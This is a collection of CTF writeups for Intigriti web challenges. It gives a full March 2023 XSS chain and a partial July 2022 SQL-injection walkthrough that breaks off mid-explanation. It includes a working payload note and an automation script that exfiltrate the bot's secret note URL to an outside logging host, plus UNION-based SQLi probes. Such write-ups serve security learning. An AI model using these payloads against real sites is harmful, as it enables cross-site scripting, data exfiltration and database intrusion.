<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-h43z
description: CTF writeups and security challenges by h43z.
---

# Writeups by h43z

Source repository: `/repos/h43z`

## Repository Index

- writeups/0323-intigriti.md
- writeups/0722-intigriti.md
- writeups/0922-intigriti.md

## Writeup Content


### File: writeups/0323-intigriti.md

# 0323 Intigriti March 2023 challenge
Make sure to follow [h43z](https://twitter.com/h43z) on twitter for more fun stuff.

## Introduction
A good start is by just clicking through the UI of https://challenge-0323.intigriti.io/ and trying all the functionalities and look at every URL.

 - `https://challenge-0323.intigriti.io/create` create a note with title and content
 - `https://challenge-0323.intigriti.io/notes` lists notes
 - `https://challenge-0323.intigriti.io/note/bf8614cc-0da7-407a-b46d-3640d1de0cad?id=bf8614cc-0da7-407a-b46d-3640d1de0cad` shows a specific note

Seems to be very simple note taking app. Without any login. As the server side code is [open source](https://github.com/0xGodson/notes-app-2.0/blob/main/app/www/app.js#L57) we see exactly how it works.

It just creates a session cookie which kind of acts as a "login" to separate users. All notes are cleared from the in memory "database" (https://github.com/0xGodson/notes-app-2.0/blob/main/app/www/app.js#L20) once an hour.

Only who creates a note you will be able to view it too because every note id is a random UUID and you get access to the list of your notes through your own session cookie.

The goal of this challenge will be to steal a FLAG. The flag is a "secret" that is stored in another users note. The other user is represented in this challenge by [bot.js](https://github.com/0xGodson/notes-app-2.0/blob/main/app/www/bot.js). It's a function that gets triggered by the endpoint `/visit?url=https://your_cool_note_link`. 

If you read the `bot.js` code you can see it's starting an headless chrome instance. Creating the secret flag note and afterwards visiting whatever URL we provided to it.

Ultimately we will need to craft a URL/Website that when given to this bot will somehow read the note with the flag and exfiltrate it back to us, the attacker.

It may be tempting to just host a web page with code like https://editor.43z.one/6hm2c 
```js
response = fetch("https://challenge-0323.intigriti.io/notes")
// then exfiltrate ... 
```
and call it a day. But the modern internet is build upon the concept of the **SameOriginPolicy**, which says, no browser will allow a webpage to simply read the response from a page on another origin. 

## Excurse into CORS
But a website operator can configure his server to allow CORS - cross origin resource sharing - by responding with specific headers to allow foreign origins to read the responses. This is exactly what the software engineer of this challenge did here.
```js
const URL = "http://127.0.0.1";
...
app.use(
  cors({
    origin: [URL], // CORS 👊
    credentials: true,
    allowedHeaders: ["Content-Type", "mode"],
  })
);
```
In this case CORS will only be allowed from the origin `http://127.0.0.1`.  

Just to be 100% CORS is a browser based mechanism. It's the opposite to the SOP. SOP closes access down, CORS opens it up again (if wanted by the web hoster). Outside of the context of browsers CORS and SOP do nothing.

At first sight it may be confusing to allow CORS from `127.0.0.1`. Because 99.9% of web apps run on the loopback address `127.0.0.1` anyway. Every page can read it's own origin. Setting it to the localhost IP is mostly done for testing. 

Imagine a production API running on `https://coolapi.com` and a production web frontend running on `https://coolfrontend.com`. Allowing CORS on `coolapi.com` from `127.0.0.1` is just a convenience for developers of `coolfrontend.com`. It allowes them to develop and run the frontend locally on `127.0.0.1` and the javascript they write can still make use of the production API at `coolapi.com`. 

After the developers push their code to production all the requests done on clients from javascript on `coolfrontend.com` will obviously have the origin `https://coolfrontend.com` when hitting `coolapi.com`. So the `coolapi.com` servers will need to get configured and allow CORS from `coolfrontend.com`.

The express cors middleware in this hypothetical scenario would look something like 
```js
app.use(
  cors({
    origin: ['http://127.0.0.1', 'https://coolfrontend.com']
  })
);
```
This may have been an unnecessary tangent for this challenge but I think it's still very important to fully grasp `SOP` and `CORS`.

It's always useful to *really* understand what the code does. In the case of this challenge the CORS code is kind of an artifact for testing. But for as as an attacker the express cors middleware, makes no difference. It could be removed and everything would still be the same for us.

## The idea of a solution
In order to read the flag we will have to somehow inject code (XSS) into a page that either runs on the origin `127.0.0.1` or `challenge-0323.intigriti.io`. Let's be more clear and check what the `bot.js` actually uses. 
```js
const URL = "http://127.0.0.1";
...
await page.goto(`${URL}/create`);
await delay(1000);
// Click submit button
await page.evaluate(() => {
	try {
		document.getElementsByName("title")[0].value = "FLAG";
		document.getElementsByName("body")[0].value = "INTIGRITI{f4k3}"; // update this
		document.getElementById("note-submit").click();
	} catch (e) {
		console.log("Error inside page.evaluate():", e);
	}
});
await delay(1000);
// Visit the user input URL
await page.goto(url);
```
It uses the default loopback address `127.0.0.1` for the
`page.goto(`${URL}/create`);`. It could have very well used the public facing `challenge-0323.intigriti.io` domain, as the bot obviously has access to the internet but the developer chose the local address.

You may ask yourself why this is important for us. The bot creates the flag note and the note will exist for users that go to `127.0.0.1` (the bot) and for the ones that use `challenge-0323.intigriti.io` (the outside world). It's the same application just accessed differently!

But the key thing is that whatever the bot used as the origin, we will need to request through a potential XSS vulnerability (which we hopefully will find later). That is because the "login" mechanism is cookie based and cookies are bound to origins. 

Imagine we already found that XSS and somehow made the bot execute ``response = fetch(`https://challenge-0323.intigriti.io/notes`)`` we would not find the flag note listed in the response. 

Only a ``fetch(`http://127.0.0.1/notes`)`` would send the correct cookies and get us the just created note with the flag in the response. 

But enough theorizing let's start bug hunting. 

## Looking for bugs
`https://challenge-0323.intigriti.io/notes` includes two javascript files `/challenge/app.js` and `/challenge/notes.js`.

`app.js` just registers  `document.getElementById("note-submit").addEventListener("click", ()=> {...` onclick handler. Interestingly there is no element `note-submit`. Bad application design! The `notes.js` is equally weird but again not interesting.

`app.js` comes first into play on `https://challenge-0323.intigriti.io/create`. It just sends the `title` and `body` of a note to the server via POST request.

After clicking a note you created you get to a URL looking like this `https://challenge-0323.intigriti.io/note/bf8614cc-0da7-407a-b46d-3640d1de0cad?id=bf8614cc-0da7-407a-b46d-3640d1de0cad`

That looks weird. You have the note id in the path `/note/bf8614cc-0da7-407a-b46d-3640d1de0cad` and then again as a GET parameter id `?id=bf8614cc-0da7-407a-b46d-3640d1de0cad`. What's going on here?

Inspecting the page source you see that the title of the note is already coming populated from the server `<h2 class="msg-info"> my title </h2><br>` but the note's content is not 
```html
<div id="noteContent" class="form-group">
                    {{ body }}
                </div>
```
If you check the server side code for that route you will see why.
```js
app.get("/note/:id", (req, res) => {
	// TODO: Congifure CORS and setup an allowList
	let mode = req.headers["mode"];
	if (mode === "read") {
		res.setHeader("content-type", "text/plain"); // no xss	
		res.send(getPostByID(req.params.id).note);
	} else {
		return res.render("note", { title: 		getPostByID(req.params.id).title });
	}
});
```
If there is no header key named `mode`  with a value equal to `read` (which there isn't if you just open the url with your browser. It's not a default header a browser sends) it will jump into the else block. Here the templating engine constructs a template named `note` and only feed it with the `title` before it is send to the client.

Obviously if you check the website and not just the initial page source in your browser you can see a note content (or body) there too. But as we just confirmed it's not coming from the initial request. The note content is fetched in `view.js` with javascript after the initial page is loaded.
```js
    id = params.get("id").trim().replace(/\s\r/,'');
    fetch(`/note/${id}`, {
        method: 'GET',
        headers: {
            'mode': 'read'
        },
    })
    .then(response => {
        return response.text()
    })
    .then(data => {
        if (data) {
            window.noteContent.innerHTML = DOMPurify.sanitize(data, {FORBID_TAGS: ['style']}); // no CSS Injection
        } else {
            document.getElementsByClassName("msg-info")[0].innerHTML="404 😭"
            window.noteContent.innerHTML = "404 😭" 
        }
    })
```
And here for the first time things get interesting. We have sink and a source. An attacker can control the `id` variable for ``fetch(`/note/${id}\``. Whatever the response is from that request will get into the classic sink of `innerHTML` in `window.noteContent.innerHTML = DOMPurify.sanitize(data, {FORBID_TAGS: ['style']});`.

But that sink is protected with `DOMPurify`. This makes XSS almost impossible.

In a normal flow of the application this  code snipped would fetch a certain id and get into the `if` block on the server.
```js
app.get("/note/:id", (req, res) => {
// TODO: Congifure CORS and setup an allowList
let mode = req.headers["mode"];
if (mode === "read") {
	res.setHeader("content-type", "text/plain"); // no xss	
	res.send(getPostByID(req.params.id).note);
} else {
```

Because this time the `mode` header was set to `read` by the client side code. 
`````js
fetch(`/note/${id}`, {
        method: 'GET',
        headers: {
            'mode': 'read'
        },
    })
 `````
 
If it wasn't for the DOMpurify this would be an easy XSS for us. 

You'd just have to create a note with the content of a payload for example `<img/src/onerror=alert(1)>`. And then give the full url of that note to the `/visit?url=URL_OF_PAYLOAD_NOTE` endpoint. The bot would pop an `alert` and we could start working on a real payload that reads the flag and exfiltrate it back to us. 

And even though we can control the `id` value in the fetch call which effectively gives us the power to guide the request to any endpoint of the challenge we want (`?id=/anything/we/like`) it simply does not change the fact that at the end of the day the response will go through DOMpurify and get sanitized. 

As it's highly unlikely that the challenge author expects us to find a bypass to DOMpurify we need to find another angle to attack.

## Let's talk about caches
Cache entries are basically HTTP responses written to disk or memory, that way if your browser makes a request he already did in the past he can pull it up directly from your computer instead of requesting it again from the remote server, which would take much longer.

All kinds of requests are under certain circumstances eligible to be cached. It doesn't matter if it's a image loaded via `<img src=...>` or web page opened via the URL bar of your browser or if it's done from javascript via a `fetch()` call.

I will use my own tool https://httpx.43z.one to play with caching a bit more. 

The tool is quite useful as it allows you to construct full responses within the URL itself. It's nice for showcasing and running quick tests. Every browser does caching differently. For us of most interest will be google chrome as the `bot.js` does use it. I will be using my other web tool https://editor.43z.one (simple editor like codepen/jsfiddle) to host code snippets. 

The example below is at https://editor.43z.one/79n8a.
```
const url = `https://httpx.43z.one?status=200&`
const responseHeaders = `access-control-allow-origin=*&cache-control=max-age=5`

fetch(url+responseHeaders)
```
We start by constructing the URL for the `httpx` web tool. Remember what we talked about in the beginning `CORS`.  The origin from where the snippet will be running is `editor.43z.one` and that's different from `httpx.43z.one`. That's why we need the browser to allow us our `CORS` request. 
We do that by telling the server (`httpx`) to respond with the header `access-control-allow-origin:*`. This gives any origin the ability to read the response and potentially cache it.

The next header controls how the browser will behave in caching this very response `cache-control=max-age=5`. It instructs the browser to cache the response for exactly 5 seconds.

Now if you open a new tab and go to https://editor.43z.one/79n8a (but make sure you already have the dev tools opened and switched to the network tab) and press the `run` button a few times - to re-execute the javascript code - you will see this.

![enter image description here](https://imgur.com/PCPbIss.png)
`(disk cache)` nicely indicates when the request was not send to the remote server and the response was directly, quickly pulled from your machine instead. Exactly how we told it, the page `https://httpx.43z.one?status=200&access-control-allow-origin=*&cache-control=max-age=5` stays in the cache for five seconds.

And the cool thing is that after running the script above https://editor.43z.one/79n8a you can go and open a new tab with the exact URL from the fetch call ``https://httpx.43z.one?status=200&access-control-allow-origin=*&cache-control=max-age=5`` and as expected it would use the version from the cache, if you do it within 5 seconds.

But it has to be said that the behavior is not standardized. Firefox seems to have different rules when something is used from cache and when not.

## Caching in the challenge
Now what does this all have to do with the challenge?  Remember the `fetch` call.
`````js
fetch(`/note/${id}`, {
        method: 'GET',
        headers: {
            'mode': 'read'
        },
    })
`````
What if if make the bot do this request to a note which holds a payload we prepared. The chrome puppeteer instance then caches the response. Afterwards we make the bot open the note URL directly and hope it will use the cached version.

If it works there will not be another request that get us into the `else` block where we just land in the `DOMpurify` trap again.
```js
app.get("/note/:id", (req, res) => {
	// TODO: Congifure CORS and setup an allowList
	let mode = req.headers["mode"];
	if (mode === "read") {
		res.setHeader("content-type", "text/plain"); // no xss	
		res.send(getPostByID(req.params.id).note);
	} else {
		return res.render("note", { title: 		getPostByID(req.params.id).title });
	}
});
```
But instead just gives us the content of the note and nothing more directly from the cache.

The theory sounds good until you realize there is this line `res.setHeader("content-type", "text/plain"); // no xss	`

Even if the browser would cache the response, it's of the wrong content type. We can easily test how browsers react with a `text/plain` content header with the `httpx` tool again. https://httpx.43z.one/?status=200&body=%3Cscript%3Ealert(1)%3C/script%3E&content-type=text/plain

![enter image description here](https://imgur.com/SX5z7hW.png)
It does not render any elements. Just plain text. In order for this to work we would need the content type of `text/html`

![enter image description here](https://imgur.com/yNITO0R.png)
If there only was a endpoint in the challenge that would return the note and not set the `text/plain` content header.

Oh look there is one! A debug endpoint which was forgotten to be removed by the developer.

```js
// DEBUG Endpoints
// TODO: Remove this before moving to prod
app.get("/debug/52abd8b5-3add-4866-92fc-75d2b1ec1938/:id", (req, res) => {
  let mode = req.headers["mode"];
  if (mode === "read") {
    res.send(getPostByID(req.params.id).note);
  } else {
    return res.status(404).send("404");
  }
});
```
This helps us a lot. Browsers seem to be very eager to render if there is no content type header present. 

We can again use `httpx` to confirm this easily, https://httpx.43z.one/?status=200&body=%3Cscript%3Ealert(1)%3C/script%3E shows an alert.

## A vary rabbit hole
So let's give this a try on the challenge
- go over to https://challenge-0323.intigriti.io/create and create a test note.
- click on the test note we created
- prepend the `id` GET parameter with `../debug/52abd8b5-3add-4866-92fc-75d2b1ec1938/`
- and send that new request

(By the way it always makes sense to automate these annoying tasks with a simple `shell/python/nodejs` script. Especially when you will be doing them many times during your exploration)

So we turned

`https://challenge-0323.intigriti.io/note/bea5becd-e3bd-4c66-93f5-4e318b97e17d?id=bea5becd-e3bd-4c66-93f5-4e318b97e17d`

into

`https://challenge-0323.intigriti.io/note/bea5becd-e3bd-4c66-93f5-4e318b97e17d?id=../debug/52abd8b5-3add-4866-92fc-75d2b1ec1938/bea5becd-e3bd-4c66-93f5-4e318b97e17d`

we used a path traversal "trick" of `../` to get away from the `/note` route that is predefined in the `fetch` call.
```js
fetch(`/note/${id}`, {
        method: 'GET',
        headers: {
            'mode': 'read'
        },
    })
 `````
by using this trick it effectively goes back one directory 

```fetch(`/note/../${id}`, {```

and we make sure to hit the `/debug` endpoint.

After we sent the manipulated request it's time to open the direct URL of the note that was requested via `fetch()` call and is now hopefully cached `https://challenge-0323.intigriti.io/debug/52abd8b5-3add-4866-92fc-75d2b1ec1938/bea5becd-e3bd-4c66-93f5-4e318b97e17d`

![enter image description here](https://imgur.com/qwle0kT.gif)
Bummer! It's not working. The response does not get pulled from the cache. Maybe it has something to do with the `vary: Origin` header that is present in the response from the request to `https://challenge-0323.intigriti.io/debug/52abd8b5-3add-4866-92fc-75d2b1ec1938/bea5becd-e3bd-4c66-93f5-4e318b97e17d`

![enter image description here](https://imgur.com/MxWllAO.png)
We can use `httpx` again to test if this is what's causing the trouble here.
First without using the header in question.
```js
const url = `https://httpx.43z.one?status=200&access-control-allow-origin=*&cache-control=max-age=100&body=hello${Date.now()}`

fetch(url)
setTimeout(_=>location=url, 1000)
```
We execute the `fetch` call and then we change the current document URL to the same URL we just fetched. https://editor.43z.one/njqq8/i 

![enter image description here](https://imgur.com/wAiyuJx.png)
Works perfectly. Now we add the header.

![enter image description here](https://imgur.com/O0OJFO3.png)
And it stops serving from the cache. 
https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Vary

> The **`Vary`** HTTP response header describes the parts of the request message aside from the method and URL that influenced the content of the response it occurs in. Most often, this is used to create a cache key when [content negotiation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Content_negotiation) is in use.

The browser takes into account the origin of the request when it decides if to show the response from the cache. And in our case the Origins differ. `fetch()` adds automatically the origin of `editor.43z.one` or in the case of the challenge `challenge-0323.intigriti.io`. But if you open an URL from the URL bar (or use in javascript `location=url` or `open(url)`) there is no `origin` header set to the request.

Wait! But is this really the reason it did not cache? If we look again into the response header on the challenge we will notice that there isn't even a `cache-control` header present.

![enter image description here](https://imgur.com/MxWllAO.png)
Maybe this is actually the reason why it's not getting cached at all. By reading through some MDN articles I stumbled upon this. https://developer.mozilla.org/en-US/docs/Web/HTTP/Caching#heuristic_caching

> HTTP is designed to cache as much as possible, so even if no Cache-Control is given, responses will get stored and reused if certain conditions are met. This is called heuristic caching.

But who the heck knows why chrome is not heuristically caching it?! I don't, maybe someone of you out there can chime in or point us to the right documentation to read.

Anyway there goes the dream of using the HTTP cache to solve this challenge. Or is there another kind of cache?

## Hello backward forward cache

https://web.dev/bfcache/

> Back/forward cache (or bfcache) is a browser optimization that enables instant back and forward navigation. It significantly improves the browsing experience for users—especially those with slower networks or devices.

Let's give this bfcache a try and see how it works in action.

![enter image description here](https://imgur.com/wH46vQL.png)

Step by step, what is going on here? First we opened a prepared payload note URL in which we put the debug URL into the `id`. Then we opened the just fetched URL directly. As expected and tested before it's not cached. Next we press the browsers back button.

Interesting at this stage, we see almost no requests happening in the dev tools, not even from cache. I guess the page must come from the bfcache then and the chrome dev tools just don't indicate it in any way. The page just appears out of thin "bfcache" air.

What's happening next is crucial. After pressing forward, we see again the 404 error page which means it's not our prepended payload note **but** the page is coming from the cache! That is kind of unexpected. Why does it not appear from thin air (bfcache) like the page before?

Turns out chrome actually has some information about the bfcache. It's inside the Application tab.

![enter image description here](https://imgur.com/871NKoP.png)
And there it gives us the reason why this page was not served from the bfcache. 

> Only pages with a status code of 2XX can be cached

And by that it probably means bf-cached. All this is thanks to the `debug` endpoint, ``app
res.status(404).send("404")``
```js
app.get("/debug/52abd8b5-3add-4866-92fc-75d2b1ec1938/:id", (req, res) => {
  let mode = req.headers["mode"];
  if (mode === "read") {
    res.send(getPostByID(req.params.id).note);
  } else {
    return res.status(404).send("404");
  }
});
```

This is all great news because somehow this made chrome use the HTTP cache instead! The only problem is we had the wrong thing in the cache. 

What if we just rearrange the requests. Instead of opening the URL in the order we did it before

1.  /note/...?id=../debug/...  (makes fetch call)
2. /debug/.... (does not pull from cache, just does request again)
3. backward to /note/...?id=../debug/... (pulls page from bfcache)
4. forward to /debug/.... (pulls response from http cache, from step 2)

instead we do it like this 
1.  /debug/.... (makes regular request, gets 404 as no mode read header present)
2. /note/...?id=../debug/... (fetch call, with correct mode header, gets payload note response)
3. backward to /debug/.... (pulls from http cache but this time from step 2 which was done with correct headers)

Now in action...

![enter image description here](https://imgur.com/P69I4uh.png)
It finally rendered the test payload note from HTTP cache by, not really using the the BF cache but just the backward button?! Without the backward button chrome did not want the serve the page from the cache. Maybe this is the *heuristically* caching strategy at work or it's a bug in chrome?!

## First stage exploit
Before we can finally craft a payload note that extracts the flag. We will have to come up with a way that the `bot.js` does the same thing, we did above, going backwards in the browser history. Fortunately this backward/forward triggering is accessible via javascript too and not just the UI.

But even before going backward we will also have to create a page that opens the two links before.
This is how such  page could look like https://editor.43z.one/n97cm

```js
params = new URL(location).searchParams
url1 = params.get('url1')
url2 = params.get('url2')

if(url1 && url2){
 w = open(url1)
 setTimeout(_=>w.location = url2, 2000)
 setTimeout(_=>w.location = `https://httpx.43z.one?status=200&body=<script>history.go(-2)<\/script>`, 3000)
}
```
This first stage "exploit" takes two URLs as GET parameters. 

It then goes on to call `open(url1)`, which opens a new tab and loads url1 in it. Luckily headless chrome allows popups by default.

That new tab is stored into the variable `w`. Two seconds later it changes the location of `w` to the second URL. And then another second later it opens an URL of the `httpx` tool that simply returns some tiny javascript `history.go(-2)`.  

We cannot simply use `w.history.go(-2)` because the tab origin and the "exploits" origin will be different. Exploit will have `editor.43z.one` and the tab `challenge-0323.intigriti.io`. The browser will not allow access to the window object of a cross origin tab. That's why we have to simply open some other page that serves the javascript.


## Second stage or how to read the flag

One way to read the bots secret note is to put following code into our payload note.
```html

<script>
	r = fetch("http://127.0.0.1/notes").then(x => x.text()).then(console.log)
</script>
```
(If you don't understand the `127.0.0.1` here, read the `The idea of a solution` section again)

But not so quick! If we do the "backward" spiel with our crafted payload we will get this.

![enter image description here](https://imgur.com/OkwzB9c.png)
All the pages on the challenge have a CSP. https://github.com/0xGodson/notes-app-2.0/blob/main/app/www/app.js#L47
```
default-src 'self'; 
style-src fonts.gstatic.com fonts.googleapis.com 'self' 'unsafe-inline';
font-src fonts.gstatic.com 'self'; 
script-src 'self'; 
base-uri 'self'; 
frame-src 'self'; 
frame-ancestors 'self';  
object-src 'none';
```
The script source can only be `self` no inline scripts are allowed.

Good that there is an injection possibility in the 404 endpoint.
```js
 app.get("*", (req, res) => {
  res.setHeader("content-type", "text/plain"); // no xss)
  res.status = 404;
  try {
    return res.send("404 - " + encodeURI(req.path));
  } catch {
    return res.send("404");
  }
});
```
See how the path is almost unchanged returned to the client `return res.send("404 - " + encodeURI(req.path));`.

The developers comment `  res.setHeader("content-type", "text/plain"); // no xss)` is true. But we can still use this endpoint in a src attribute for a `<script src=...>` tag.

We cas use `httpx` to confirm this https://editor.43z.one/4xjv4

```html
<script src="//httpx.43z.one?status=200&content-type=text/plain&body=alert(1)"></script>
```
shows an alert. 

Luckily for us the developer made a mistake in setting the status code with `res.status = 404;`. That's not how you do it with express. It's correctly done like this `res.status(404)`.

If the status code was really 404 on that endpoint it would not work for us anymore.
You can confirm this with `httpx` again, by switching `?status=200` with `?status=404`. All you get is browser error.

To turn the `404 - /noneexistingpath` into valid javascript we simply choose a path like `a/;alert(1)`

This way the response becomes `404 - /a/;alert(1)`. A number (404) minus a regex (/a/). Then our actual payload can follow. https://editor.43z.one/vndh9
```html
<script src="https://challenge-0323.intigriti.io/a/;alert(1)"></script>
```
But we will run into trouble if we use a more complex payload. Like the initial idea of

```js
r=fetch('http://127.0.0.1/notes').then(x=>x.text()).then(console.log)
```
The the `encodeURI` would turn it into 
```js
r=fetch('http://127.0.0.1/notes').then(x=%3Ex.text()).then(console.log)
```
It encodes all characters except 
```
A–Z a–z 0–9 - _ . ! ~ * ' ( )

; / ? : @ & = + $ , #
```
We would either need the `=>` for an anonymous arrow function or `{}` for defining a regular function to get the result from `fetch`

There is an alternative though to using javascript and `fetch`. 

The CSP says `frame-src 'self'; ` we can just an `iframe` and frame the `/notes` endpoint this way we don't have to use all the code for `fetch()` and just access it directly via the html element.
The iframe is on the same origin as the payload note itself so it should be no problem to access the content of the iframe.

```html
<iframe id=i src=http://127.0.0.1/notes></iframe>
<script src="http://127.0.0.1/a/;alert(i.contentDocument.links.item(0).href)"></script>
```
`document.links` provides us with all links on the page. And the first one will be the URL of the flag note.

A neat alternative to `document.links[0]`, `document.links.item(0)` is used, that way we don't run into the issue of `encodeURI` escaping `[]`.

But if we test the payload above we will get an error.

![enter image description here](https://imgur.com/zbmh1lV.png)
Although there clearly is a "test" flag note in the iframe. And if we run `i.contentDocument.links.item(0).href` manually we get the URL of it, the payload it self was not able to get it and says `item(0)` was undefined.

This indicates that at the time the payload script run the iframe with `/note` has not yet finished loading.

There is a syntax of `setTimeout()` that would not make use of `=>` or `{}` that could possibly help us here. `setTimeout('alert(...)', 2000)`, this would provide enough time until the iframe finished loading. But CSP does not allow it. 

From https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src#unsafe_eval_expressions

> If a page has a CSP header and `'unsafe-eval'` isn't specified with the `script-src` directive, the following methods are blocked and won't have any effect:

-   `eval()`
-   `Function()`
-   When passing a string literal like to methods like: `setTimeout("alert(\"Hello World!\");", 500);`
    -   `setTimeout()`
    -   `setInterval()`
    -   `window.setImmediate`
-   `window.execScript()`


In our case `'unsafe-eval'` is not specified within the CSP. 

But there is another neat trick to delay the javascript execution. By placing a `style` that `import`'s some garbage. But we still have to respect that CSP
```
style-src fonts.gstatic.com fonts.googleapis.com 'self' 'unsafe-inline';
```
If we run this test payload note
```html
<iframe id=i src=http://127.0.0.1/notes></iframe>
<style>@import '//fonts.gstatic.com'</style>
<script src="http://127.0.0.1/a/;alert(i.contentDocument.links.item(0).href)"></script>
```
we will alert the flag URL. Now we just have to exfiltrate it back to us. We do this by changing the documents `location` to server we have access to and append the secret note URL to the path. I'm going to use https://log.43z.one. Another tool I created that simply logs all requests that are made to it on a website. 

`location = 'https://log.43z.one/' + flag`


# Final instructions
1. create the note with the content and call the note id of it **PAYLOAD_ID**
```html
<iframe id=i src=http://127.0.0.1/notes></iframe>
<style>@import '//fonts.gstatic.com'</style>
<script src="http://127.0.0.1/a/;location='//log.43z.one/'+i.contentDocument.links.item(0).href)"></script>
```

2. Construct **URL1** like this https://challenge-0323.intigriti.io/debug/52abd8b5-3add-4866-92fc-75d2b1ec1938/ **PAYLOAD_ID**

3. Construct **URL2** like this https://challenge-0323.intigriti.io/note/**PAYLOAD_ID**?id=../debug/52abd8b5-3add-4866-92fc-75d2b1ec1938/ **PAYLOAD_ID**

4. Construct a web page with the following content and name it's URL **FIRST_STAGE**

```js
params = new URL(location).searchParams
url1 = params.get('url1')
url2 = params.get('url2')

if(url1 && url2){
 w = open(url1)
 setTimeout(_=>w.location = url2, 2000)
 setTimeout(_=>w.location = `https://httpx.43z.one?status=200&body=<script>history.go(-2)<\/script>`, 3000)
}
```
  

6. Construct **VISIT_URL** like this **FIRST_STAGE**?url1=**URL1**&url2=**URL2**

7. Open the URL https://log.43z.one in a Tab 1
8. Open the URL https://challenge-0323.intigriti.io/visit?url= **VISIT_URL** in Tab 2
9. Watch Tab 1 until the URL of note with the flag appears
10. Open URL of flag note 
11. Enjoy the flag `INTIGRITI{b4ckw4rD_f0rw4rd_c4ch3_x55_3h?}`

Here is how it looks exploiting the challenge locally with the setting `headless` to `false` in `bot.js`.

![enter image description here](https://imgur.com/Imt05NF.png)

Here the final script that does all the tasks we did manually before.
```sh
#!/bin/sh
# dependencies curl, pup, jq

CHALLENGE="https://challenge-0323.intigriti.io"
ENDPOINT="http://127.0.0.1"

# create the contents of the payload note
# store it as JSON into payload.txt ready to be passed to /create
cat << EOF > payload.txt
{"title":"payload","note":"<iframe id=i src=$ENDPOINT/notes></iframe><style>@import'//fonts.gstatic.com'</style><script src=\"$ENDPOINT/a/;location='//log.43z.one/'+i.contentDocument.links.item(0).href\"></script>"}
EOF

# send request to the challenge to create the note
# read POST body from payload.txt
curl -s -b cookies.txt -c cookies.txt "$CHALLENGE/create" -X POST -H 'Content-Type: application/json' --data-binary "@payload.txt"

# extract the id of the payload note we just created
id="$(curl -s -b cookies.txt -c cookies.txt "$CHALLENGE/notes" | pup "li > a attr{href}" | tail -c 37)"

# generate the URL that will be given to /visit
# the first stage exploit editor.43z.one/kczdj that takes two parameters
# url1 is debug endpoint to our payload note
# url2 is the /note endpoint that fetches the debug payload note
encoded="$(echo "https://editor.43z.one/kczdj/i?url1=$ENDPOINT/debug/52abd8b5-3add-4866-92fc-75d2b1ec1938/$id&url2=$ENDPOINT/note/$id?id=../debug/52abd8b5-3add-4866-92fc-75d2b1ec1938/$id" | jq -sRr @uri)"

# append the FULL URL to the /visit endpoint
echo "$CHALLENGE/visit?url=$encoded"
```


## THE END
That was fun. Learned a lot.  I hope you did too.

twitter: [h43z](https://twitter.com/h43z) 
homepage: [h.43z.one](https://h.43z.one) 



### File: writeups/0722-intigriti.md

# Intigriti July 2022 Challenge
###### writeup by [@h43z](https://twitter.com/h43z), [h.43z.one](https://h.43z.one)

```
For best learning effect always try to solve on your own first! 
If you hit a dead end, 
read writeup until you get new inspiration on how to proceed and stop reading further. 
Repeat until successful solve.
```

https://challenge-0722.intigriti.io/

Although advertised as an XSS challenge, on inspecting the website and clicking
through it, it becomes obvious quickly, there is not much javascript involved. 
No sources, No sinks, no code.

There is one place though where the website sends the server
an instruction, the Archive links.

```
https://challenge-0722.intigriti.io/challenge/challenge.php?month=3
```

The value `3` in the month GET parameter tells the server what article the client
wants to read. Typically blog content is stored in a database, so we should check
for SQL injection.

Such vulnerability could allow us to control the response from the server and
smuggle a XSS payload in. But more on that later.

It always makes sense to imagine one self in the role of the web developer and
how the backend and its queries look like. As attackers we constantly form
assumptions which explain the behavior we encounter. Those mental models might not
be 100% correct in reality but as long as they help us continue successfully
they are good enough for us.

We theorize the backend does something like

```
select * from posts where month = 3;
```
When we send the `?month=3`, the database then returns some data
```
It's March already | 2022-03-22 02:35:10 | Jake | Time goes fast
```
And judging from the file extension of challenge **.php**, PHP then after receiving 
the data from the database formats it and returns it to the client.

The easiest way to check for SQLi is by messing up the query syntax which leads
to an error.

And indeed if we provide month with the value **3'**

```
https://challenge-0722.intigriti.io/challenge/challenge.php?month=3'
```

we get an `error`.

Seems like the server blindly takes the GET parameter and puts it into the query.
One can see how it would lead to syntax error.

```
select * from posts where month = 3';
```

If the server uses MySQL the error it throws will look similar to this

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
``` 

Let's see if we can inject some logic into the query to make sure we have a 
SQLi here. First we provide a month that we are positive will not exist in the 
table entries.

```
https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999
```

We would expect no error because it's valid syntax but an empty response.
And that's exactly what happens.

Let's build upon that query by adding `or true` which would result in following
query.

```
select * from posts where month = 9999 or true;
```

The `WHERE` statement becomes a conditional. Returning either columns where the
month equal 9999 (none, we already checked) or `TRUE` which applies to all entries
in that table.

If the mental model we have about the database is correct this should make the
server return all posts that it has.

Again, seems to be exactly what happens.

The future goal will be to use this SQLi to return a string that demonstrates XSS.
Like `<img/src/onerror=alert(1)>`.

In order to do that we will utilize the SQL `UNION` operator. But to make things
easier for for now our "payload" will simply be a number and not a string.

```
The UNION operator is used to combine the result-set of two or more SELECT statements.
```

Here an example of how it works.

```
select age,name,email from mytable where age = 30 union select 1337,1337,1337
30   | bob  | bob@gmail.com
1337 | 1337 | 1337
```

The key here is that every SELECT statement within UNION must have the same 
number of columns as the previous SELECT. 

Following would lead to an error

```
select age,name,email from mytable where age = 30 union select 1337
The used SELECT statements have a different number of columns
```

Up next we figure out how many columns the query we are attacking
returns. We do this by just adding a column until the website does **not** show 
an error.

```
https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999 union select 1
error

https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999 union select 1,2
error

https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999 union select 1,2,3
error

https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999 union select 1,2,3,4
error

https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999 union select 1,2,3,4,5
```
No error! This reveals that the select statement returns 5 columns. And looking
at the website we already see it rendering 3 columns. The integer `2` is in the place of
to the post title, `5` is the creation date, `3` the blog post content.
Oddly enough Integer `1` and `4` do not show up which in part is unsurprising because 
sometimes developers ask for more information from the database
than they will later use in rendering the content. Especially if you use `select *` 
which is a lazy habit among programmers.

Let's continue and change the integer 2 into a string, more precisely into a XSS
payload that shows we can execute javascript.

```
